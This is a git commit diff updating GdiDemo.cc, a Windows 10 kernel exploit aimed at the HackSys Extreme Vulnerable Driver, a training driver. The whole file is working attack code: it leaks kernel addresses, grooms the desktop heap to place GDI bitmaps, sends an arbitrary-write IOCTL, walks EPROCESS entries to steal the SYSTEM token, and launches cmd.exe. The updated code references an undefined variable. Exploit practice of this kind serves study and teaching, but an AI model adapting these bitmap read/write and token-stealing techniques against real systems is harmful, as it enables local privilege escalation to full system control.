4f23cd4af02e2ad3c27319409fdbd17bfd5f22e6
Yn <30512781+akayn@users.noreply.github.com>
2017-09-17 16:30:18 -0700

    Update GdiDemo.cc

--- Win10/BitMap_Win_10_15063.0.amd64fre.rs2_release.170317-1834/GdiDemo.cc
+++ Win10/BitMap_Win_10_15063.0.amd64fre.rs2_release.170317-1834/GdiDemo.cc
@@ -15,7 +15,8 @@
  ---->
 */
 
-
+#pragma once
+#include "stdafx.h"
 #include <Windows.h>
 #include <stdio.h>
 #include <cstdint>
@@ -24,22 +25,26 @@
 
 #include <Wingdi.h>
 
+#define hDev "\\\\.\\HacksysExtremeVulnerableDriver"
+
 typedef void*(NTAPI *lHMValidateHandle)(
 	HWND h,
 	int type
 );
 
+int g = 1;
 
-HBITMAP ManagerBitmap;
-HBITMAP WorkerBitmap;
+typedef struct _hBmp {
+	HBITMAP hBmp;
+	DWORD64 kAddr;
+	PUCHAR pvScan0;
+} HBMP, *PHBMP;
 
-LRESULT 
+LRESULT
 CALLBACK MainWProc(
-	__in HWND hWnd,
-	__in UINT uMsg,
-	__in WPARAM wParam,
-	__in LPARAM lParam
-	)
+	HWND hWnd, UINT uMsg,
+	WPARAM wParam, LPARAM lParam
+)
 {
 	return DefWindowProc(hWnd, uMsg, wParam, lParam);
 }
@@ -47,10 +52,9 @@ CALLBACK MainWProc(
 lHMValidateHandle pHmValidateHandle = NULL;
 
 // https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
-BOOL 
+BOOL
 GetHMValidateHandle(
-	__in void
-) 
+)
 {
 	HMODULE hUser32 = LoadLibraryA("user32.dll");
 	if (hUser32 == NULL) {
@@ -84,10 +88,8 @@ GetHMValidateHandle(
 
 PUCHAR
 GetNtos(
-	__in void
-	)
+)
 {
-	// defines.
 	typedef enum _SYSTEM_INFORMATION_CLASS {
 		SystemBasicInformation = 0,
 		SystemPerformanceInformation = 2,
@@ -100,7 +102,6 @@ GetNtos(
 		SystemRegistryQuotaInformation = 37,
 		SystemLookasideInformation = 45
 	} SYSTEM_INFORMATION_CLASS;
-
 	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
 		HANDLE Section;
 		PVOID MappedBase;
@@ -113,309 +114,206 @@ GetNtos(
 		USHORT OffsetToFileName;
 		UCHAR FullPathName[256];
 	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
-
 	typedef struct _SYSTEM_MODULE_INFORMATION {
 		ULONG NumberOfModules;
 		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
 	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
-
 	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
 		SYSTEM_INFORMATION_CLASS SystemInformationClass,
 		PVOID SystemInformation,
 		ULONG SystemInformationLength,
 		PULONG ReturnLength
 	);
-
 	DWORD len;
 	PSYSTEM_MODULE_INFORMATION ModuleInfo;
 	PVOID Nt = NULL;
-
-	// Dynamic import.
 	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
 		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
 	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
-
-	// Requere Medium integrity level ( > win7 ),
-	// if run from low il, then return NULL.
 	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
 		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (!ModuleInfo){return NULL;}
+	if (!ModuleInfo) { return NULL; }
 	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
 	Nt = ModuleInfo->Module[0].ImageBase;
-
-	// No longer needed, free the memory.
 	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
 	return (PUCHAR)Nt;
 }
 
 DWORD64
 GetPsInitialSystemProcess(
-	__in void
-	) 
+)
 {
 	PUCHAR NtBaddr = (PUCHAR)GetNtos();
-	//printf("ntoskrnl Base Addr: %p\n", NtBaddr);
+	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
 	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
 	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
 	auto Psi = addr - ntos + NtBaddr;
-	//printf("PsInitialSystemProcess: %p\n", Psi);
+	printf("[+] PsInitialSystemProcess: %p\n", Psi);
 	return (DWORD64)Psi;
 }
 
-VOID
-SprayPool(
-	__in    LPCWSTR classNumber,
-	__inout WNDCLASSEX wnd,
-	__out   HWND hWnd
-)
-{
-
-	HINSTANCE hInst = GetModuleHandleA(NULL);
-	auto hCls = RegisterClassExW(&wnd);
-	hWnd = CreateWindowExW(0, classNumber, NULL, NULL, 0, 0, NULL, NULL, 0, 0, hInst, 0);
-	
-}
-
-ULONGLONG
-RegisterCls(
-	__in    LPCWSTR classNumber,
-	__inout WNDCLASSEX wnd,
-	__out   HWND hWnd
+ATOM
+RegisterhWnd(
+	LPCWSTR class_name,
+	LPCWSTR menu_name
 	)
 {
-	BOOL bFound = GetHMValidateHandle();
-	if (!bFound) {
-		return 1;
-	}
-	HINSTANCE hInst = GetModuleHandleA(NULL);
-	auto hCls = RegisterClassExW(&wnd);
-	hWnd = CreateWindowExW(0, classNumber, L"aaa", 0xcf0000, 0, 0, 300, 300, 0, 0, hInst, 0);
+	WNDCLASS wind_class = WNDCLASS();
+	wind_class.lpszClassName = class_name;
+	wind_class.lpszMenuName = menu_name;
+	wind_class.lpfnWndProc = MainWProc;
+	return RegisterClassW(&wind_class);
+}
 
-	uintptr_t uWND = (uintptr_t)pHmValidateHandle(hWnd, 1);
-
-	ULONGLONG uval = *reinterpret_cast<ULONGLONG *>(uWND);
-	//printf("\tuval: 0x%llx\n", uWND);
-	ULONGLONG rval = *reinterpret_cast<ULONGLONG *>(uWND + 0x20);
-	//printf("\trval: 0x%llx\n", rval);
-
-	ULONGLONG kTagCLS = *reinterpret_cast<ULONGLONG *>(uWND + 0xa8);
-
-	ULONGLONG ulClientDelta = rval - uWND;
-	//printf("\tulClientDelta: 0x%llx\n", ulClientDelta);
-	//printf("\tkTagCLS: 0x%llx\n", kTagCLS);
-	ULONGLONG lpszMenuName = *reinterpret_cast<ULONGLONG *>(kTagCLS - ulClientDelta + 0x90);
-	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);
-
-	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);*/
+void
+DestroyWnd(
+	HWND hWnd
+	) 
+{
 	DestroyWindow(hWnd);
-	UnregisterClassW(classNumber, NULL);
-	//int k;
-	//scanf("%d",&k);
+	UnregisterClassW(L"aaa",NULL);
+}
+
+HWND
+CreateWindowObject(
+	) 
+{
+	WCHAR* Buff = new WCHAR[0x8F0];
+	RtlSecureZeroMemory(Buff, 0x8F0);
+	RtlFillMemory(Buff, 0x8F0, '\x41');
+	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
+	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
+}
+
+DWORD64
+LeaklpszMenuName(
+	HWND hWnd
+	) 
+{
+	DWORD64 pCLSOffset = 0xa8;
+	DWORD64 lpszMenuNameOffset = 0x90;
+	BOOL bRet = GetHMValidateHandle();
+	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
+	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64)(lpUserDesktopHeapWindow) + 0x20) - (DWORD64)(lpUserDesktopHeapWindow);
+	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
+	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
 	return lpszMenuName;
 }
 
-void
-InitMgr(
-	__in void
+BOOL
+Leak(
+	_In_ int y,
+	_In_ HBMP &hbmp
 	)
 {
-	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
-	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
-	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
-	ManagerBitmap = CreateBitmap(
-		0x100,
-		2,
-		1,
-		8,
-		&Buff
-	);
-	//printf("hMgr %p\n", &ManagerBitmap);
-}
-
-void
-InitWorker(
-	__in void
-	)
-{
-	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
-	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
-	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
-	WorkerBitmap = CreateBitmap(
-		0x100,
-		2,
-		1,
-		8,
-		&Buff
-	);
-	//printf("hWorker %p\n", &WorkerBitmap);
-}
-
-ULONGLONG 
-AllocFreeObjects(
-	__in int k
-	) 
-{
-
-	WNDCLASSEX wnd;
-	HWND hWnd;
-	ULONGLONG previous_entry = 0;
-	ULONGLONG plpszMenuName;
-	wchar_t buffer[256];
-	int classNumber = 0;
 	
-	for (int h = 0; h <= 80; h++) {
-		wsprintfW(buffer, L"%d", classNumber);
-		WNDCLASSEX wnd = { 0x0 };
-		wnd.cbSize = sizeof(wnd);
-		wnd.lpszClassName = buffer;
-		wnd.lpfnWndProc = MainWProc;
-		WCHAR* Buff = new WCHAR[0x8F0];
-		RtlSecureZeroMemory(Buff, 0x8F0);
-		RtlFillMemory(Buff, 0x8F0, '\x41');
-		//printf("\tallocated WndCls size is: %p\n",  0x8f0);
-		wnd.lpszMenuName = Buff;
-		//printf("%d\n", classNumber);
-		//__debugbreak();
-		SprayPool(buffer, wnd, hWnd);
-	}
-	
-	while (1){
-			wsprintfW(buffer, L"%d", classNumber);
-			WNDCLASSEX wnd = { 0x0 };
-			wnd.cbSize = sizeof(wnd);
-			wnd.lpszClassName = buffer;
-			wnd.lpfnWndProc = MainWProc;
-			WCHAR* Buff = new WCHAR[0x8F0];
-			RtlSecureZeroMemory(Buff, 0x8F0);
-			RtlFillMemory(Buff, 0x8F0, '\x41');
-			//printf("\tallocated WndCls size is: %p\n",  0x8f0);
-			wnd.lpszMenuName = Buff;
-			//printf("%d\n", classNumber);
-			//__debugbreak();
-			plpszMenuName = RegisterCls(buffer, wnd, hWnd);
-			if ((previous_entry == plpszMenuName)) { // && (1<=y)
-				// printf("T: %p\n", plpszMenuName);
-				//printf("?");
-				//auto res = DestroyWindow(hWnd);
-				//printf("%d\n", res);
-				//res = UnregisterClassW(buffer, NULL);
-				//printf("%d\n", res);
-				if (k == 1) {
-					InitMgr();
-				}
-				else {
-					InitWorker();
-				}
-				return plpszMenuName;
-				
+	DWORD64 Curr, Prev = NULL;
+
+	for (int i = 0; i <= 20; i++) {
+		HWND TestWindowHandle = CreateWindowObject();
+		Curr = LeaklpszMenuName(TestWindowHandle);
+		if (1<=i) {
+			if (Curr == Prev) {
+				DestroyWnd(TestWindowHandle);
+				break;
 			}
-			previous_entry = plpszMenuName;
-			classNumber = classNumber + 1;
+		}
+		DestroyWnd(TestWindowHandle);
+		Prev = Curr;
 	}
-	//auto res = DestroyWindow(hWnd);
-	//printf("%d\n", res);
-	//res = UnregisterClassW(buffer, NULL);
-	//printf("%d\n", res);
-	if (k == 1) {
-		InitMgr();
-	} else {
-		InitWorker();}
 
-	//printf(": 0x%llx\n", plpszMenuName);
+	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
+	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
+	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
+	hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
+	hbmp.kAddr = Curr;
+	hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);
 
-	return plpszMenuName;
+	return TRUE;
 }
 
-
-DWORD64 
+DWORD64
 BitmapRead(
-	__in HBITMAP Mgr,
-	__in HBITMAP Wrk,
-	__in DWORD64 addr
-	)
+	HBITMAP &Mgr,
+	HBITMAP &Wrk,
+	DWORD64 addr
+)
 {
-	//printf("reading addr at: %llx\n", &addr);
-	LPVOID bRet = VirtualAlloc(
-		0, 0x8,
-		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
-	);
-	SetBitmapBits(Mgr, 0x8, *reinterpret_cast<LPVOID *>(addr));
 
-	if (GetBitmapBits(Wrk, 0x8, bRet) == NULL) {
+	printf("reading addr at: %p\n", addr);
+	LPVOID bRet = VirtualAlloc(
+		0, sizeof(addr),
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_READWRITE
+	);
+	auto m = SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)&addr);
+	if (m == 0) {
+		printf("error setting bits!");
+		exit(GetLastError());
+	}
+
+	if (GetBitmapBits(Wrk, sizeof(bRet), bRet) == NULL) {
 		printf("err");
 		exit(GetLastError());
 	}
-	return *reinterpret_cast<DWORD64 *>(bRet);
+	auto retV = *((DWORD64 *)bRet);
+	VirtualFree( &bRet, sizeof(bRet), MEM_FREE | MEM_RELEASE );
+	printf("%p\n", retV);
+	return retV;
 }
 
 DWORD64 
 BitmapWrite(
-	__in HBITMAP Mgr,
-	__in HBITMAP Wrk,
-	__in DWORD64 addr,
-	__in DWORD64 Val
-	)
+	HBITMAP &Mgr,
+	HBITMAP &Wrk,
+	DWORD64 addr,
+	DWORD64 Val
+	) 
 {
-	//printf("OverWriting addr at: %llx with : %llx\n", addr, Val);
-	SetBitmapBits(Mgr, 0x8, *reinterpret_cast<LPVOID *>(addr)); 
-	if (SetBitmapBits(Wrk, 0x8, *reinterpret_cast<LPVOID *>(Val)) == NULL) { 
+	
+	if (SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)(&addr)) == 0) {
+		printf("error setting bits");
 		exit(GetLastError());
 	}
-	return(0);
+	if (SetBitmapBits(Wrk, sizeof(Val), (LPVOID *)(&Val)) == 0) {
+		printf("error setting bits");
+		exit(GetLastError());
+	}
 }
 
 int
-TokenOverWrite(
-	__in HBITMAP Mgr,
-	__in HBITMAP Wrk,
-	__in DWORD64 EP
-	)
-{
-
-
-	DWORD64 Systoken = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x358 );
-
-	DWORD CurrentPID = GetCurrentProcessId(); 
-
-	DWORD64 NextEp = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x2f0 ) - (DWORD64)0x2e8 - (DWORD64)0x8;
-
-	DWORD64 Current = NULL;
-
-
-	while (true) {
-
-		DWORD64 Nextpid = BitmapRead(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x2e8 );
-
-		//printf("Systoken: %llx\n", Nextpid);
-
-		if ( Nextpid == (DWORD64)GetCurrentProcessId() ) {
-
-			Current = BitmapRead( Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x358 );
-
-			// printf("C, N: %llx,  %llx\n", Current, NextEp);
-			// int g;
-			// scanf("%d",&g);
-
-			break;
-		}
-
-		NextEp = BitmapRead(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x2f0) - (DWORD64)0x2e8 - (DWORD64)0x8;
-	}
-
-	BitmapWrite(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x358, Systoken);
-
-	return NULL;
-
-}
-
-int 
 main(
-	__in void
-	)
+)
 {
+	printf("\n[!] gdi feng shui ..\n");
+	printf("[>] Spraying the pool\n");
+	printf("[>] leaking ulClientDelta...\n");
+	HBMP managerBitmap;
+	HBMP workerBitmap;
+	if (!Leak(0, managerBitmap)) {
+		exit(GetLastError());
+	}
+	if (!Leak(1, workerBitmap)) {
+		exit(GetLastError());
+	}
+	
+	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
+	printf("[+] hMgr: %p\n", &managerBitmap.hBmp);
+	printf("[+] hWorker: %p\n", &workerBitmap.hBmp);
+	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
+	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);
 
-	auto dev = CreateFile(
-		L"\\\\.\\HacksysExtremeVulnerableDriver",
+	byte Buff[sizeof(LPVOID) * 2] = { 0 };
+
+	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(wPtr, &workerBitmap.pvScan0, sizeof(LPVOID));
+	memcpy(Buff, &whatPointerAddr, sizeof(LPVOID));
+	memcpy(Buff + 8, &managerBitmap.pvScan0, sizeof(LPVOID));
+
+	DWORD u = 0;
+
+	auto dev = CreateFileA(
+		hDev,
 		GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -425,73 +323,95 @@ main(
 	);
 
 	if (dev == INVALID_HANDLE_VALUE) { 
-		exit( GetLastError() ); 
-	}
+		exit(GetLastError()); }
 
-	auto bRet = GetHMValidateHandle();
-	if (!bRet) {
-		exit( GetLastError() );
-	}
-	
-	auto addr = AllocFreeObjects(1);
-	auto hManager_pvscan0_offset = addr + (ULONGLONG)0x50;
-
-	//printf("Mgr pvscan0 offset: %p\n", hManager_pvscan0_offset);
-
-	auto saddr = AllocFreeObjects(2);
-	auto hWorker_pvscan0_offset = saddr + (ULONGLONG)0x50;
-
-	//printf("Wrk pvscan0 offset: %p\n", hWorker_pvscan0_offset);
-
-	//int jk;
-	//scanf("%d", &jk);
-
-	LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
-	lpSourceTargetAddress = &hWorker_pvscan0_offset;
-
-	auto Buff = (PUCHAR)malloc(sizeof(LPVOID) * 2);
-
-	memcpy(Buff, &lpSourceTargetAddress, (sizeof(LPVOID)));
-	memcpy(Buff + (sizeof(LPVOID)), &hManager_pvscan0_offset, (sizeof(LPVOID)));
-
-	DWORD u = 0;                     
+	printf("\n[>] ldr\n");
+	printf("[+] Opened Device Handle at: %p\n", &dev);
+	printf("[+] Device Name: %s\n", hDev);
+	printf("[+] Sending Ioctl: %p\n", 0x22200B);
+	printf("[+] Buffer length: %d\n", sizeof(LPVOID) * 2);
 
 	auto bResult = DeviceIoControl(
-		dev,
-		0x22200B,
-		Buff,						
-		(sizeof(LPVOID) * 2),			
-		NULL,
-		0,
+		dev,	
+		0x22200B,						
+		Buff,					
+		sizeof(Buff),			
+		NULL, 0,						
 		&u,							
 		(LPOVERLAPPED)NULL
 	);
 
 	if (!bResult) {
-		CloseHandle( dev );
-		exit( GetLastError() );
+		CloseHandle(dev);
+		exit(GetLastError());
 	}
 
-	CloseHandle( dev );
+	CloseHandle(dev);
 
 	DWORD64 _EP = GetPsInitialSystemProcess();
-
-	//printf("System _EP: %p", _EP);
-	//
-	//auto Systoken = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
-	//	_EP + (DWORD64)0x358));
-	//
-	//int i;
-	//scanf("%d",&i);
+	printf("\n[!] running exploit...\n\n\n");
+	DebugBreak();
 
 	
 
-	TokenOverWrite( ManagerBitmap, WorkerBitmap, _EP );
+	DWORD64 SepPtr = BitmapRead(
+		managerBitmap.hBmp,
+		workerBitmap.hBmp,
+		_EP
+	);
+
+	DWORD64 SysTokenPtr = SepPtr + 0x358;
+
+	DWORD64 SysToken = BitmapRead(
+		managerBitmap.hBmp,
+		workerBitmap.hBmp,
+		SysTokenPtr
+	);
+
+	DWORD64 NextPEP = BitmapRead(
+		managerBitmap.hBmp,
+		workerBitmap.hBmp, 
+		SepPtr + 0x2F0
+	) - 0x2E8 - 0x8;
+
+
+	DWORD64 Token = NULL;
+
+
+	while (1) {
+
+		DWORD64 NextPID = BitmapRead(
+			managerBitmap.hBmp,
+			workerBitmap.hBmp,
+			NextPEP + 0x2E8
+		);
+
+		if (NextPID == GetCurrentProcessId()) {
+			Token = BitmapRead(
+				managerBitmap.hBmp,
+				workerBitmap.hBmp,
+				NextPEP + 0x358
+			);
+			break;
+
+		}
+
+		NextPEP = BitmapRead(
+			managerBitmap.hBmp,
+			workerBitmap.hBmp,
+			NextPEP + 0x2F0
+		) - 0x2E8 - 0x8;
+
+	}
+
+
+	BitmapWrite(
+		managerBitmap.hBmp,
+		workerBitmap.hBmp,
+		NextPEP + 0x358,
+		SysToken
+	);
 
 	system("cmd.exe");
-	system("pause");
-	//int y;
-	//scanf( "%d", &y );
-    return NULL;
+	return 0;
 }
-
